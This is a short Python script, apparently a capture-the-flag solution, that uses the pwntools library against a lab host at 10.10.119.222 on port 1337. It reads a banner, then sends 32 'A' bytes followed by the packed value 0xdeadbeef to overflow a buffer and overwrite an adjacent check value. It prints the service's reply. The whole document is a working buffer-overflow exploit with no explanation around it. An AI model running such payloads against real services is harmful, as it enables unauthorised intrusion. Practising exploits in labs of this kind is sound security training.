#!/usr/bin/python3

from pwn import *

connect = remote('10.10.119.222',1337)
print(connect.recvn(18))

pattern = "A" * 32
cmp = p32(0xdeadbeef)
connect.send(pattern.encode() + cmp)
print(connect.recvn(34).decode())